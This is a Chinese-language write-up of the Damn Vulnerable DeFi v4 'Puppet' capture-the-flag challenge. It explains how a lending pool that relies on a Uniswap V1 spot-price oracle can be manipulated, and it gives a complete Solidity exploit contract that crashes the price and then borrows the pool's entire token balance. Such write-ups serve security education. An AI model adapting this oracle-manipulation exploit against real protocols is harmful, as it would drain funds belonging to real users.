# Damn Vulnerable DeFi v4 - puppet

- https://www.damnvulnerabledefi.xyz/challenges/puppet/

## check condition

player 只能發起一個交易，清空 lending pool 所持有的 token 並轉移至 recovery

```solidity
// Player executed a single transaction
assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

// All tokens of the lending pool were deposited into the recovery account
assertEq(
    token.balanceOf(address(lendingPool)),
    0,
    "Pool still has tokens"
);
assertGe(
    token.balanceOf(recovery),
    POOL_INITIAL_TOKEN_BALANCE,
    "Not enough tokens in recovery account"
);
```

## break

主要的問題在 lending pool 使用 uniswap-v1 Dex 的 spot price 作為評估抵押品價值的依據。當 Dex 流動性不太足夠時，可以操作 Dex 上的 spot price。

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

可以從 setup 看到，play 手上的 token 和 eth 都比 dex 裡面還多，可以對 spot price 有顯著的影響:

```solidity
uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
```

## solution

```solidity
contract Trigger {
    DamnValuableToken internal token;
    IUniswapV1Exchange internal exchange;
    PuppetPool internal pool;
    address internal recovery;

    constructor(
        DamnValuableToken token_,
        IUniswapV1Exchange exchange_,
        PuppetPool pool_,
        address recovery_
    ) {
        token = token_;
        exchange = exchange_;
        pool = pool_;
        recovery = recovery_;
    }

    function exec(
        uint256 tokenAmount_,
        uint256 borrowAmount_
    ) external payable {
        // pull token
        token.transferFrom(msg.sender, address(this), tokenAmount_);
        // manipulate price
        token.approve(address(exchange), type(uint256).max);
        exchange.tokenToEthSwapInput(tokenAmount_, 1, block.timestamp * 2);
        // borrow
        uint256 need = pool.calculateDepositRequired(borrowAmount_);
        pool.borrow{value: need}(borrowAmount_, recovery);
    }

    receive() external payable {}
}

Trigger trigger = new Trigger(
    token,
    uniswapV1Exchange,
    lendingPool,
    recovery
);
token.approve(address(trigger), type(uint256).max);
trigger.exec{value: PLAYER_INITIAL_ETH_BALANCE}(
    PLAYER_INITIAL_TOKEN_BALANCE,
    POOL_INITIAL_TOKEN_BALANCE
);
```
